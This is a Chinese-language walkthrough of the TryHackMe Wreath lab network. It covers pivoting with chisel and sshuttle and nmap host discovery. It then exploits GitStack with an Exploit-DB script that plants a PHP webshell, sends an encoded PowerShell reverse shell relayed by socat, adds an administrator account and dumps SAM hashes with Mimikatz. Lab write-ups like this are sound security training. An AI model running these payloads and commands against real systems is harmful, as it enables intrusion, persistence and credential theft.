+<p>现在我们已经了解了如何使用 chisel 创建 SOCKS 代理，接下来让我们看看如何使用 chisel 创建端口转发。</p>
+<p><em><strong>Remote Port Forward:</strong></em><br>远程端口转发是指我们从受感染的目标连接回来以创建转发。</p>
+<p>对于远程端口转发，在我们的攻击机器上，我们使用与以前完全相同的命令：<br><code>./chisel server -p LISTEN_PORT --reverse &amp;</code></p>
+<p>这再次设置了一个凿子侦听器，供受感染的主机重新连接。<br>不过，这次重新连接的命令略有不同：<br><code>./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &amp;</code></p>
+<p>您可能会认为这与 SSH 反向端口转发方法非常相似，其中我们指定要打开的本地端口、目标 IP 和目标端口，并用冒号分隔，请注意“LISTEN_PORT”和“LOCAL_PORT”之间的区别。这里的“LISTEN_PORT”是我们启动凿子服务器的端口，“LOCAL_PORT”是我们希望在自己的攻击机器上打开以链接到所需目标端口的端口。</p>
+<p>使用一个旧的示例，假设我们自己的 IP 是 172.16.0.20，受感染服务器的 IP 是 172.16.0.5，我们的目标是 172.16.0.10 上的端口 22 将 172.16.0.10:22 转发回端口 2222。在我们的攻击机器上将如下所示：<br><code>./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &amp;</code></p>
+<p>连接回我们的攻击机器，作为凿子服务器开始运行：<br><code>./chisel server -p 1337 --reverse &amp;</code></p>
+<p>这将允许我们通过导航到 127.0.0.1:2222 来访问 172.16.0.10:22（通过 SSH）。</p>
+<p><strong>Local Port Forward:</strong><br>与 SSH 一样，本地端口转发是我们从自己的攻击机器连接到监听受感染目标的凿子服务器的地方。</p>
+<p>在受感染的目标上，我们设置了凿子服务器：<br><code>./chisel server -p LISTEN_PORT</code></p>
+<p>我们现在从我们的攻击机器连接到这个，如下所示：<br><code>./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT</code></p>
+<p>例如，要连接到 172.16.0.5:8000（运行凿子服务器的受感染主机），将本地端口 2222 转发到 172.16.0.10:22（我们的预期目标），我们可以使用：<br><code>./chisel client 172.16.0.5:8000 2222:172.16.0.10:22</code></p>
+<hr>
+<p>与后台 socat 进程一样，当我们想要销毁 chisel 连接时，我们可以使用“jobs”来查看后台作业列表，然后使用“kill %NUMBER”来销毁每个 chisel 进程。</p>
+<p><strong>注意：</strong> 在 Windows 上使用 Chisel 时，请务必记住上传文件扩展名为 <code>.exe</code> <em>（例如</em> <code>chisel.exe</code>）</p>
+<h1 id="sshuttle"><a href="#sshuttle" class="headerlink" title="sshuttle"></a>sshuttle</h1><p>最后，我们来看看本节的最后一个工具：<a target="_blank" rel="noopener" href="https://github.com/sshuttle/sshuttle">sshuttle</a>。</p>
+<p>该工具与我们迄今为止介绍的其他工具有很大不同，它不执行端口转发，并且它创建的代理与我们已经看到的代理完全不同，而是使用 SSH 连接来创建隧道代理。简而言之，它模拟一个 VPN，允许我们通过代理路由流量<em>而无需使用代理链</em>（或类似的东西），我们可以直接连接到目标网络中的设备。通常连接到网络设备，因为它通过 SSH（安全 shell）创建隧道，所以我们通过隧道发送的任何内容也会被加密，这是一个很好的好处，我们完全在攻击机器上使用 sshuttle，就像我们一样。将通过 SSH 连接到远程服务器。</p>
+<p>虽然这听起来像是一个令人难以置信的升级，但它并非没有缺点，首先，sshuttle 只能在 Linux 目标上运行，它还需要通过 SSH 访问受感染的服务器，而且还需要在服务器上安装 Python。 通过 SSH 访问，理论上可以上传 Python 的静态副本并使用它。这些限制确实在一定程度上限制了 sshuttle 的使用；但是，当它是一个选项时，它往往是一个绝佳的选择！</p>
+<p>首先，我们需要在 Kali 上安装 sshuttle，这就像使用 apt 包管理器一样简单：<br><code>sudo apt install sshuttle</code></p>
+<hr>
+<p>使用 sshuttle 连接到服务器的基本命令如下：<br><code>sshuttle -r username@address subnet </code></p>
+<p>例如，在我们虚构的 172.16.0.x 网络中，服务器位于 172.16.0.5 上，该网络受到感染，该命令可能如下所示：<br><code>sshuttle -r user@172.16.0.5 172.16.0.0/24</code></p>
+<p>然后我们会被要求提供用户的密码，然后该工具将被动地坐在后台并将相关流量转发到目标网络。</p>
+<p>我们还可以使用“-N”选项来尝试根据受感染服务器自己的路由表自动确定子网，而不是指定子网：<br><code>sshuttle -r username@address -N</code></p>
+<p>请记住，这可能并不总是成功！</p>
+<p>与以前的工具一样，这些命令也可以通过在末尾附加“&amp;”符号来设置背景。</p>
+<p>如果这有效，您应该看到以下行：<br><code>c : Connected to server.</code></p>
+<hr>
+<p>嗯，这很好，但是如果我们没有用户的密码，或者服务器只接受基于密钥的身份验证，会发生什么情况？</p>
+<p>不幸的是，sshuttle 目前似乎没有指定私钥来向服务器进行身份验证的简写，也就是说，我们可以使用“–ssh-cmd”开关轻松绕过此限制。</p>
+<p>此开关允许我们指定在尝试对受感染服务器进行身份验证时 sshuttle 执行什么命令，默认情况下，这只是不带参数的“ssh”，使用“–ssh-cmd”开关，我们可以选择不同的命令。执行身份验证：例如，<code>ssh -i keyfile</code>！</p>
+<p>因此，当使用基于密钥的身份验证时，最终命令如下所示：<br><code>sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET</code></p>
+<p>要使用之前的示例，命令将是：<br><code>sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24</code></p>
+<hr>
+<p><strong>请注意：</strong> 使用 sshuttle 时，您可能会遇到如下错误：<br><code>client: Connected. client_loop: send disconnect: Broken pipe client: fatal: server died with error code 255</code></p>
+<p>当您连接的受感染计算机是您尝试访问的子网的一部分时，就会发生这种情况。例如，如果我们连接到 172.16.0.5 并尝试转发 172.16.0.0/24，那么我们就会这样做。将受感染的服务器包含在新转发的子网内，从而中断连接并导致工具死亡。</p>
+<p>为了解决这个问题，我们告诉 sshuttle 使用“-x”开关将受感染的服务器从子网范围中排除。</p>
+<p>使用我们之前的例子：<br><code>sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5</code></p>
+<p>这将允许 sshuttle 创建连接而不会中断自身。</p>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>这是一个很长且理论性很强的部分，所以很荣幸能走到这一步！</p>
+<p>本节的最大收获是：强烈建议您在网络中通过“许多”不同的方式进行进一步研究，因为有很多有趣的技术我们没有时间在这里介绍。 （例如，在完全 root 的目标上，可以使用已安装的防火墙（例如 iptables 或 Windows 防火墙）来创建进入其他无法访问的网络的入口点。同样，可以在路由表中手动设置路由将您的攻击机器的流量路由到目标网络，而不需要像 Proxychains 或 Foxyproxy 这样的代理工具。</p>
+<p>作为本节中工具的摘要：</p>
+<ul>
+<li>Proxychains 和 FoxyProxy 用于访问使用其他工具之一创建的代理</li>
+<li>SSH 可用于创建端口转发和代理</li>
+<li>plink.exe 是 Windows 的 SSH 客户端，允许您在 Windows 上创建反向 SSH 连接</li>
+<li>Socat 是重定向连接的一个不错的选择，并且可用于以各种不同的方式创建端口转发</li>
+<li>Chisel 可以做与 SSH 端口转发/隧道完全相同的事情，但不需要在盒子上进行 SSH 访问</li>
+<li>当我们对目标有 SSH 访问权限时，sshuttle 是创建代理的更好方法</li>
+</ul>
+<p>旋转确实是一个广阔的主题；但是，希望您通过本节中的理论学到了一些东西！</p>
+<p>现在是尝试旋转部分演示的技术的好时机，因此在继续之前尝试所有这些技术并确保您对它们感到满意。</p>
+<p><strong>注意：</strong> 如果使用 socat 或任何其他在受感染主机上打开端口的技术（在此网络过程中），请确保使用 15000 以上的端口，以方便其他用户在早期使用课程的各个部分。</p>
+<h1 id="Enumeration-2"><a href="#Enumeration-2" class="headerlink" title="Enumeration"></a>Enumeration</h1><p>是时候测试您新学到的知识了！</p>
+<p>下载 <a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap">static nmap 二进制文件</a>，将其重命名为“nmap-USERNAME”，替换为您自己的名称。最后，以您选择的方式将其上传到目标。</p>
+<p><strong>例如，使用 Python 网络服务器：</strong></p>
+<p>在 Kali 上（包含 Nmap 二进制文件的目录内）：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo python3 -m http.server 80</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后，针对目标：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl ATTACKING_IP/nmap-USERNAME -o /tmp/nmap-USERNAME &amp;&amp; chmod +x /tmp/nmap-USERNAME</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/f621bb960163.png" alt="Using cURL and a Python HTTP server to upload nmap to the target"></p>
+<hr>
+<p>现在使用二进制文件扫描网络，该命令将如下所示：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">./nmap-USERNAME -sn 10.x.x.1-255 -oN scan-USERNAME</span><br></pre></td></tr></tbody></table></figure>
+
+<p>您需要替换您的用户名和正确的 IP 范围，例如：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">./nmap-MuirlandOracle -sn 10.200.72.1-255 -oN scan-MuirlandOracle</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里“-sn”开关用于告诉 Nmap 不要扫描任何端口，而只是确定哪些主机处于活动状态。</p>
+<p>请注意，这也适用于 CIDR 表示法（例如 10.x.x.0/24）。</p>
+<p>使用您所学到的知识来回答以下问题！</p>
+<p><strong>注意：</strong> 以“.250”结尾的主机 是 OpenVPN 服务器，应将其排除在所有答案之外，它不是易受攻击的网络的一部分，也不应成为目标。 in <code>.1</code> <em>（用于创建网络的 AWS 基础设施的一部分）——这也超出了范围，应从所有答案中排除。</em></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[root@prod-serv tmp]# ./nmap-mikannse -sn 10.200.219.0/24</span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-08-20 10:26 BST</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report for ip-10-200-219-1.eu-west-1.compute.internal (10.200.219.1)</span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (-0.18s latency).</span><br><span class="line">MAC Address: 02:5C:2E:49:D2:67 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-200-219-100.eu-west-1.compute.internal (10.200.219.100)</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">MAC Address: 02:66:85:49:5E:9B (Unknown)</span><br><span class="line">Nmap scan report for ip-10-200-219-150.eu-west-1.compute.internal (10.200.219.150)</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">MAC Address: 02:FE:1E:DC:10:F5 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-200-219-250.eu-west-1.compute.internal (10.200.219.250)</span><br><span class="line">Host is up (0.00014s latency).</span><br><span class="line">MAC Address: 02:89:93:40:4F:4D (Unknown)</span><br><span class="line">Nmap scan report for ip-10-200-219-200.eu-west-1.compute.internal (10.200.219.200)</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 4.94 seconds</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[root@prod-serv tmp]# ./nmap-mikannse -sT -p- 10.200.219.150</span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-08-20 10:53 BST</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report for ip-10-200-219-150.eu-west-1.compute.internal (10.200.219.150)</span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.00063s latency).</span><br><span class="line">Not shown: 65531 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br><span class="line">5357/tcp open  wsdapi</span><br><span class="line">5985/tcp open  wsman</span><br><span class="line">MAC Address: 02:FE:1E:DC:10:F5 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1205.59 seconds</span><br><span class="line">[root@prod-serv tmp]# Connection to 10.200.219.200 closed by remote host.</span><br><span class="line">Connection to 10.200.219.200 closed.</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h1 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h1><p>考虑一下我们在上一个任务中发现的下一个目标上的有趣服务，选择一种旋转技术并使用它来连接到该服务，使用攻击计算机上的 Web 浏览器！</p>
+<p>一句建议：强烈建议使用 sshuttle 创建进入网络其余部分的初始访问点，这是因为 CentOS 目标上的防火墙将证明使用此处所示的某些技术会出现问题。稍后将在房间中讨论，不过如果您愿意使用防火墙打开端口，那么端口转发或代理也可以工作。</p>
+<p>使用sshuttle进行一个隧道搭建</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/桌面]</span><br><span class="line">└─$ sshuttle -r root@10.200.219.200 --ssh-cmd "ssh -i root_key" 10.200.219.0/24 -x 10.200.219.200</span><br><span class="line">c : Connected to server.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后访问.150的80端口的web服务，但是报了错</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Using the URLconf defined in app.urls, Django tried these URL patterns, in this order:</span><br><span class="line"></span><br><span class="line">    ^registration/login/$</span><br><span class="line">    ^gitstack/</span><br><span class="line">    ^rest/</span><br><span class="line"></span><br><span class="line">The current URL, , didn't match any of these.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现有三个路由,第二个路由时gitstack,也就是说运行着gitstack服务,访问这个路由。但是默认凭据已经被更改，本地查找gitstack的利用点</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/桌面]</span><br><span class="line">└─$ searchsploit gitstack                                          </span><br><span class="line">-------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                              |  Path</span><br><span class="line">-------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">GitStack - Remote Code Execution                                                            | php/webapps/44044.md</span><br><span class="line">GitStack - Unsanitized Argument Remote Code Execution (Metasploit)                          | windows/remote/44356.rb</span><br><span class="line">GitStack 2.3.10 - Remote Code Execution                                                     | php/webapps/43777.py</span><br><span class="line">-------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(mikannse㉿kali)-[~/桌面]</span><br><span class="line">└─$ locate php/webapps/43777.py</span><br><span class="line">/usr/share/exploitdb/exploits/php/webapps/43777.py</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(mikannse㉿kali)-[~/桌面]</span><br><span class="line">└─$ cp /usr/share/exploitdb/exploits/php/webapps/43777.py .</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Code-Review"><a href="#Code-Review" class="headerlink" title="Code Review"></a>Code Review</h1><p>在上一个任务中，我们发现了一个可能对第二台服务器上运行的服务起作用的漏洞。</p>
+<p>使用以下命令在本地目录中创建此漏洞的副本：<br><code>searchsploit -m EDBID</code></p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/74c9d9ad5c3a.png" alt="Using searchsploit to copy the exploit to the local directory"></p>
+<p>不幸的是，searchsploit 存储的本地漏洞利用副本使用 DOS 行结尾，这可能会导致在 Linux 上执行脚本时出现问题：</p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/c8bf9c7b639a.png" alt="Demonstration of the line endings error which can occur when trying to run scripts written on Windows on a Linux machine"></p>
+<p>在使用该漏洞之前，我们必须使用 dos2unix 工具将它们转换为 Linux 行结尾：<br><code>dos2unix ./EDBID.py</code></p>
+<p>如果“dos2unix”不可用，也可以使用“sed”手动完成此操作：<br><code>sed -i 's/\r//' ./EDBID.py</code></p>
+<hr>
+<p>文件转换后，是时候仔细阅读该漏洞以确保我们知道它在做什么。该漏洞位于 Exploit-DB 上，这意味着它不太可能是完全恶意的，但不能保证它会“起作用”,或者做任何接近利用服务中的漏洞的事情。</p>
+<p>在您最喜欢的文本编辑器中打开漏洞利用程序，然后开始吧！</p>
+<h1 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>在上一个任务中，我们查看了发现的漏洞利用的源代码，确定了需要更新的行，然后进行了必要的更改。</p>
+<p>现在是运行漏洞利用的时候了！<br><img src="https://assets.tryhackme.com/additional/wreath-network/d7bd5d950eae.png" alt="Exploit PoC in action!"></p>
+<p>成功！</p>
+<p>该漏洞不仅完美地发挥了作用，还为我们提供了以 NT AUTHORITY\SYSTEM（Windows 目标上排名最高的本地帐户）的命令执行权限。</p>
+<p>从这里我们想要获得一个完整的反向 shell，我们有两个选择：</p>
+<p>1.我们可以更改漏洞利用中的命令并重新运行代码</p>
+<ol start="2">
+<li>我们可以利用我们对脚本的了解来利用同一个 webshell 来为我们执行更多命令，而无需执行两次完整的利用</li>
+</ol>
+<p>第二个选项比第一个选项安静得多，所以让我们使用它。</p>
+<hr>
+<p>我们上传的 webshell 使用参数“a”（默认情况下）响应 POST 请求，这意味着我们有两种简单的方法可以从命令行使用 cURL，或者使用 BurpSuite 作为 GUI 选项。 。</p>
+<p><strong>With cURL:</strong><br><code>curl -X POST http://IP/web/exploit-USERNAME.php -d "a=COMMAND"</code></p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/c4fb965ea6f5.png" alt="Using cURL to activate the webshell, gaining the same result as in the previous screenshot"></p>
+<p><strong>注意：</strong>在此屏幕截图中，<code>gitserver.thm</code> <em>已添加到</em> <code>/etc/hosts</code> <em>文件中，映射到目标 IP 地址。</em></p>
+<p><strong>使用 BurpSuite：</strong><br>我们首先打开 Burp 代理（如果您需要帮助，请参阅 <a target="_blank" rel="noopener" href="https://tryhackme.com/room/rpburpsuite">Burpsuite room</a>！）并导航到漏洞利用 URL：<br><img src="https://assets.tryhackme.com/additional/wreath-network/3b9c350a53d8.png" alt="Capturing a request with BurpSuite"></p>
+<p>然后，我们按“Ctrl + R”将请求发送到顶部菜单上的 Repeater。</p>
+<p>接下来，我们将第 1 行的“GET”更改为“POST”，然后在第 9 行添加 <code>Content-Type</code> 标头，告诉服务器接受 POST 参数：<br><code>Content-Type: application/x-www-form-urlencoded</code></p>
+<p>最后，在第 11 行我们添加 <code>a=COMMAND</code>：<br><img src="https://assets.tryhackme.com/additional/wreath-network/640de3e036a9.png" alt="The altered request with POST, the content-type header, and the payload (a=whoami) highlighted"></p>
+<p>按发送，然后看到回复！<br><img src="https://assets.tryhackme.com/additional/wreath-network/063482e92f8b.png" alt="Activated the webshell with Burpsuite"></p>
+<hr>
+<p>有两种方法可供选择，选择您最喜欢的，我们的目标是获得外壳！</p>
+<p>更改完ip和webshell的名字之后，执行成功</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/桌面]</span><br><span class="line">└─$ python2 43777.py </span><br><span class="line">/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.</span><br><span class="line">[+] Get user list</span><br><span class="line">[+] Found user twreath</span><br><span class="line">[+] Web repository already enabled</span><br><span class="line">[+] Get repositories list</span><br><span class="line">[+] Found repository Website</span><br><span class="line">[+] Add user to repository</span><br><span class="line">[+] Disable access for anyone</span><br><span class="line">[+] Create backdoor in PHP</span><br><span class="line">Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. &lt;br /&gt;Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. </span><br><span class="line">[+] Execute command</span><br><span class="line">"nt authority\system</span><br><span class="line">" </span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl -X POST 'http://10.200.219.150/web/exploit-mikan.php' -d "a=whoami"</span><br><span class="line">"nt authority\system</span><br><span class="line">" </span><br></pre></td></tr></tbody></table></figure>
+
+<p>因为发现.150这台机子不能直达到攻击机，所以需要使用socat在.200这台机子做一个中继反弹shell</p>
+<p>先在攻击机开启一个监听:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/桌面]</span><br><span class="line">└─$ rlwrap -cAr nc -lvnp 443 </span><br><span class="line">listening on [any] 443 ...</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>先开启一个防火墙规则在20000端口</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[root@prod-serv ~]# firewall-cmd --zone=public --add-port 20000/tcp</span><br><span class="line">success</span><br></pre></td></tr></tbody></table></figure>
+
+<p>开启socat中继进程</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[root@prod-serv tmp]# ./socat-mikann tcp-l:20000 tcp:10.50.216.34:443 &amp;</span><br><span class="line">[1] 2239</span><br></pre></td></tr></tbody></table></figure>
+
+<p>进行一个反弹shell,在攻击机成功接收到shell(需要进行完全的url编码否则会出错)</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl -X POST 'http://10.200.219.150/web/exploit-mikan.php' -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.219.200%27%2C20000%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Stabilisation-amp-Post-Exploitation"><a href="#Stabilisation-amp-Post-Exploitation" class="headerlink" title="Stabilisation &amp; Post Exploitation"></a>Stabilisation &amp; Post Exploitation</h1><p>在上一个任务中，我们在本地 Windows 计算机上以尽可能高的权限运行远程命令执行，这意味着我们不需要提升该目标的权限。</p>
+<p>在接下来的任务中，我们将研究该网络的第二个教学点——命令和控制框架：帝国，但在此之前，让我们稍微巩固一下我们的立场。</p>
+<p>从我们对此目标所做的枚举中我们知道端口 3389 和 5985 是开放的，这意味着（使用具有正确权限的帐户）我们应该能够通过 RDP（端口 3389）获取 GUI 或稳定的 CLI shell。使用 WinRM（端口 5985）。</p>
+<p>，我们需要一个用户帐户（而不是我们当前使用的服务帐户），其中包含 RDP 的“远程桌面用户”组或 WinRM 的“远程管理用户”组“管理员”中的用户。 “组胜过RDP组，原来的管理员帐户可以随意访问。</p>
+<p>我们已经拥有最终访问权限，所以让我们创建一个这样的帐户！在这里选择一个唯一的用户名（您的 TryHackMe 用户名即可），并且显然选择一个您在其他地方不使用的密码。</p>
+<p>首先我们创建帐户本身：<br><code>net user USERNAME PASSWORD /add</code></p>
+<p>接下来，我们将新创建的帐户添加到“管理员”和“远程管理用户”组中：<br><code>net localgroup Administrators USERNAME /add</code></p>
+<p><code>net localgroup "Remote Management Users" USERNAME /add</code></p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/5b8e4ccaed23.png" alt="Adding a new user"></p>
+<p>现在我们就可以使用这个账号来稳定的访问盒子了！</p>
+<hr>
+<p>如前所述，我们可以使用 RDP 或 WinRM 来实现此目的。</p>
+<p><strong>注意：</strong> 虽然目标设置为允许通过 RDP 进行多个会话，但为了其他用户结合目标上的内存限制攻击网络，如果您坚持使用基于 CLI 的 WinRM，我们将不胜感激。我们将在本任务的下一部分中简要使用 RDP，但在网络中继续前进时请使用 WinRM。</p>
+<p>让我们通过 WinRM 访问该盒子。 为此，我们将使用一个名为 <a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> 的很棒的小工具。</p>
+<p>默认情况下，它不会安装在 Kali 上，因此请使用以下命令从 Ruby Gem 包管理器安装它：<br><code>sudo gem install evil-winrm</code></p>
+<p>安装了evil-winrm后，我们可以使用此处显示的语法连接到目标：<br><code>evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP</code></p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/28b967dedffa.png" alt="Authenticating with Evil-WinRM"></p>
+<p><em>如果您使用 SSH portforward 而不是 sshuttle 来访问 Git Server，则需要在此处设置第二条隧道来访问端口 5985。在这种情况下，您可能还需要使用 -P 开关指定目标端口（例如-</em><code>i 127.0.0.1 -P 58950</code><em>).</em></p>
+<p>请注意，evil-winrm 通常为添加的管理员帐户提供中等完整性 shell，即使您的新帐户具有管理员权限，您实际上也无法通过 winrm 使用它执行管理操作。</p>
+<hr>
+<p>现在让我们看看如何通过 RDP 连接 GUI 环境。</p>
+<p>Linux 有许多可用的 RDP 客户端，其中最通用的是“xfreerdp”——如果尚未安装，您可以使用以下命令安装 xfreerdp：<br><code>sudo apt install freerdp2-x11</code></p>
+<p>如前所述，xfreerdp 是一个非常通用的工具，具有大量可用选项，从将音频和 USB 连接路由到目标，再到通过 RDP 进行哈希传递攻击，最基本的连接语法如下：<br><code>xfreerdp /v:IP /u:USERNAME /p:PASSWORD</code></p>
+<p>例如：<br><code>xfreerdp /v:172.16.0.5 /u:user /p:'password123!'</code></p>
+<p>请注意（因为这是一个命令行工具），包含特殊字符的密码必须用引号引起来。</p>
+<p>成功进行身份验证后，将打开一个新窗口，提供对目标的 GUI 访问权限。<br><img src="https://assets.tryhackme.com/additional/wreath-network/a40854512a5e.png" alt="Demonstration of logging in over RDP"></p>
+<p>也就是说，我们可以使用 xfreerdp 做更多事情，这些开关特别有用：-</p>
+<ul>
+<li><code>/dynamic-resolution</code> – 允许我们调整窗口大小，在此过程中调整目标的分辨率</li>
+<li><code>/size:WIDTHxHEIGHT</code> – 为不会使用 <code>/dynamic-resolution</code> 自动调整大小的目标设置特定大小</li>
+<li><code>+clipboard</code> – 启用剪贴板支持</li>
+<li><code>/drive:LOCAL_DIRECTORY,SHARE_NAME</code> - 在攻击机器和目标之间创建一个共享驱动器，这个开关非常有用，因为它允许我们非常轻松地在远程目标上使用我们的工具包，并将任何输出直接保存回。从本质上讲，这意味着我们实际上不必在目标上创建任何文件，例如，要在名为“share”的共享中共享当前目录，您可以使用：<code>/drive:.,share</code>，其中句点 (<code>.</code>) 指的是当前目录</li>
+</ul>
+<p>创建共享驱动器时，可以通过命令行“\tsclient\”进行访问，也可以通过“此电脑”下的文件资源管理器进行访问：<br><img src="https://assets.tryhackme.com/additional/wreath-network/9cd2021f9d36.png" alt="Showing the share created by xfreerdp when specifying /drive"></p>
+<p>请注意，共享的名称将根据您在“/drive”开关中选择的内容而变化。</p>
+<p>一个有用的共享目录是 Kali 上的“/usr/share/windows-resources”目录，它共享 Kali 上存储的大部分 Windows 工具，包括我们接下来将使用的 Mimikatz，这将生成完整的命令：<br><code>xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share</code></p>
+<hr>
+<p>获得 GUI 访问权限并将 Windows 资源共享到目标后，我们现在可以非常轻松地使用 Mimikatz 转储该目标的本地帐户密码哈希值。接下来，我们以管理员身份打开“cmd.exe”或“PowerShell”窗口。 （即右键单击该图标，然后单击“以管理员身份运行”）在 GUI 中并输入以下命令：<br><code>\\tsclient\share\mimikatz\x64\mimikatz.exe</code><br><img src="https://assets.tryhackme.com/additional/wreath-network/fcb90c0d6fc5.png" alt="Accessing mimikatz via the RDP share"></p>
+<p><strong>注意：</strong>如果您使用了不同的共享名，则需要替换它。同样，如果命令出错，您可能需要使用  <code>sudo apt install mimikatz</code> 在 Kali 上安装 mimikatz。</p>
+<p>加载 Mimikatz 后，我们接下来需要赋予自己调试权限并将完整性提升到系统级别，这可以通过以下命令来完成：<br><code>privilege::debug</code></p>
+<p><code>token::elevate</code><br><img src="https://assets.tryhackme.com/additional/wreath-network/ce71a0375943.png" alt="Elevating privileges in mimikatz"></p>
+<p>如果我们愿意，可以使用“log”命令记录 Mimikatz 输出，例如：“log c:\windows\temp\mimikatz.log”，将 Mimikatz 输出保存到 Windows Temp 目录中。我们的 Kali 机器，但请注意，运行 RDP 会话的本地用户必须可写入远程目标。</p>
+<p>我们现在可以使用以下命令转储所有 SAM 本地密码哈希值：<br><code>lsadump::sam</code></p>
